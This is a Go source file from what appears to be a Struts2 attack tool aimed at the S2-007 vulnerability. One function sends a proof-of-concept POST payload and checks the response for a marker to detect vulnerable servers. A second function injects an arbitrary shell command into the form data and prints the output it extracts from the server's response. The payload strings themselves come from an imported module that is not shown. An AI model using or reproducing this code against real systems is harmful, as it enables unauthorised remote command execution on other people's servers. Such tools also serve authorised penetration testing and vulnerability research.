package s007

import (
	"ST2G/cvemod/x51utils"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
)

func Check(targeturl string,postData string) {
	client := &http.Client{
		Timeout:x51utils.Timeout,
	}
	postData = strings.Replace(postData,"fuckit",x51utils.POC_s007_check,1)
	req, err := http.NewRequest("POST", targeturl,strings.NewReader(postData) )
	req.Header.Set("User-Agent", x51utils.GlobalUserAgent)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	if err != nil {
		log.Fatal("Error reading request. ")
	}
	response, _ := client.Do(req)
	defer response.Body.Close()
	content, _ := ioutil.ReadAll(response.Body)
	respBody := string(content)
	isVulnable := strings.Contains(respBody, "6308")
	if isVulnable {
		x51utils.Colorlog("Found Struts2-007!")

	} else {
		fmt.Println("Struts2-007 Not Vulnerable.")
	}

}
func ExecCommand(targeturl string,command string,postData string){
	client := &http.Client{
		Timeout:x51utils.Timeout,
	}
	postData = strings.Replace(postData,"fuckit",x51utils.POC_s007_exec(command),1)
	req, err := http.NewRequest("POST", targeturl,strings.NewReader(postData) )
	req.Header.Set("User-Agent", x51utils.GlobalUserAgent)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; param=value")
	if err != nil {
		log.Fatal("Error reading request. ")
	}
	response, _ := client.Do(req)
	defer response.Body.Close()
	content, _ := ioutil.ReadAll(response.Body)
	respBody := string(content)
	cmdout := GetBetweenStr(respBody,"struts2checkstart","struts2checkend")[17:]	//从第17位开始，去掉前面的标记字符串struts2checkstart
	fmt.Println(cmdout)
}
func GetBetweenStr(str, start, end string) string {
	n := strings.Index(str, start)
	if n == -1 {
		n = 0
	}
	str = string([]byte(str)[n:])
	m := strings.Index(str, end)
	if m == -1 {
		m = len(str)
	}
	str = string([]byte(str)[:m])
	return str
}